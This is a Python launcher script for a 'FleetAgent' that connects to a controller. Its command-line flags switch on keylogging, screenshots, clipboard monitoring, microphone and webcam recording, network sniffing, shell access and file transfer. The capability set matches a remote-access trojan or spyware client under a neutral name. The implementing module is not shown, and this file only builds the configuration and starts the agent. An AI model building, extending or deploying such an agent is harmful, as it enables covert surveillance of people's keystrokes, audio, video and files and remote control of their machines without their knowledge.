#!/usr/bin/env python
"""
Entry point for running a FleetAgent.

Usage:
    python -m fleet.run_agent --controller-url http://localhost:8080/api/v1/fleet
    python -m fleet.run_agent --config /path/to/agent_config.yaml
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import platform
import signal
import socket
import sys
import uuid
from pathlib import Path
from typing import Any

import yaml

from fleet.agent import FleetAgent

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


def get_mac_address() -> str:
    """Get the MAC address of the primary network interface."""
    try:
        mac = uuid.getnode()
        return ":".join(f"{(mac >> i) & 0xFF:02x}" for i in range(0, 48, 8))
    except Exception:
        return "00:00:00:00:00:00"


def load_config(config_path: str | None) -> dict[str, Any]:
    """Load configuration from YAML file."""
    if config_path and Path(config_path).exists():
        with open(config_path) as f:
            return yaml.safe_load(f) or {}
    return {}


def build_agent_config(args: argparse.Namespace, file_config: dict[str, Any]) -> dict[str, Any]:
    """Build agent configuration from CLI args and config file."""
    # Start with file config
    config = file_config.copy()

    # CLI args override file config
    if args.controller_url:
        config["controller_url"] = args.controller_url
    if args.agent_id:
        config["agent_id"] = args.agent_id
    if args.hostname:
        config["hostname"] = args.hostname

    # Set defaults for required fields
    config.setdefault("controller_url", "http://localhost:8080/api/v1/fleet")
    config.setdefault("agent_id", f"agent-{uuid.uuid4().hex[:8]}")
    config.setdefault("hostname", socket.gethostname())
    config.setdefault("platform", platform.system().lower())
    config.setdefault("version", "1.0.0")
    config.setdefault("mac_address", get_mac_address())

    # Intervals
    config.setdefault("heartbeat_interval", args.heartbeat_interval)
    config.setdefault("reconnect_interval", args.reconnect_interval)

    # Capabilities
    config.setdefault("cap_keylogging", args.cap_keylogging)
    config.setdefault("cap_screenshots", args.cap_screenshots)
    config.setdefault("cap_file_upload", args.cap_file_upload)
    config.setdefault("cap_file_download", args.cap_file_download)
    config.setdefault("cap_clipboard", args.cap_clipboard)
    config.setdefault("cap_microphone", args.cap_microphone)
    config.setdefault("cap_webcam", args.cap_webcam)
    config.setdefault("cap_process", args.cap_process)
    config.setdefault("cap_network", args.cap_network)
    config.setdefault("cap_shell", args.cap_shell)

    return config


async def run_agent(config: dict[str, Any]) -> None:
    """Run the FleetAgent until interrupted."""
    agent = FleetAgent(config)

    # Handle shutdown signals
    loop = asyncio.get_running_loop()
    shutdown_event = asyncio.Event()

    def signal_handler() -> None:
        logger.info("Shutdown signal received")
        shutdown_event.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, signal_handler)
        except NotImplementedError:
            # Windows doesn't support add_signal_handler
            pass

    try:
        await agent.start()
        logger.info(f"Agent {config['agent_id']} running. Press Ctrl+C to stop.")

        # Wait for shutdown signal
        await shutdown_event.wait()

    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received")
    finally:
        await agent.stop()
        logger.info("Agent stopped")


def main() -> None:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Run a FleetAgent that connects to a fleet controller",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    # Connection settings
    parser.add_argument(
        "--controller-url",
        type=str,
        default=None,
        help="URL of the fleet controller API (e.g., http://localhost:8080/api/v1/fleet)",
    )
    parser.add_argument(
        "--agent-id",
        type=str,
        default=None,
        help="Unique agent identifier (auto-generated if not provided)",
    )
    parser.add_argument(
        "--hostname",
        type=str,
        default=None,
        help="Hostname to report (defaults to system hostname)",
    )

    # Config file
    parser.add_argument(
        "--config",
        type=str,
        default=None,
        help="Path to YAML configuration file",
    )

    # Intervals
    parser.add_argument(
        "--heartbeat-interval",
        type=float,
        default=60.0,
        help="Heartbeat interval in seconds",
    )
    parser.add_argument(
        "--reconnect-interval",
        type=float,
        default=30.0,
        help="Reconnect interval in seconds after failures",
    )

    # Capabilities (all default to False for safety)
    parser.add_argument(
        "--cap-keylogging", action="store_true", help="Enable keylogging capability"
    )
    parser.add_argument(
        "--cap-screenshots", action="store_true", help="Enable screenshot capability"
    )
    parser.add_argument(
        "--cap-file-upload", action="store_true", help="Enable file upload capability"
    )
    parser.add_argument(
        "--cap-file-download", action="store_true", help="Enable file download capability"
    )
    parser.add_argument("--cap-clipboard", action="store_true", help="Enable clipboard monitoring")
    parser.add_argument("--cap-microphone", action="store_true", help="Enable microphone recording")
    parser.add_argument("--cap-webcam", action="store_true", help="Enable webcam capture")
    parser.add_argument("--cap-process", action="store_true", help="Enable process monitoring")
    parser.add_argument("--cap-network", action="store_true", help="Enable network sniffing")
    parser.add_argument("--cap-shell", action="store_true", help="Enable shell access")

    # Logging
    parser.add_argument(
        "--log-level",
        type=str,
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        default="INFO",
        help="Logging level",
    )

    args = parser.parse_args()

    # Set log level
    logging.getLogger().setLevel(getattr(logging, args.log_level))

    # Load config
    file_config = load_config(args.config)
    config = build_agent_config(args, file_config)

    logger.info(f"Starting FleetAgent with ID: {config['agent_id']}")
    logger.info(f"Controller URL: {config['controller_url']}")

    # Run the agent
    try:
        asyncio.run(run_agent(config))
    except Exception as e:
        logger.error(f"Agent failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
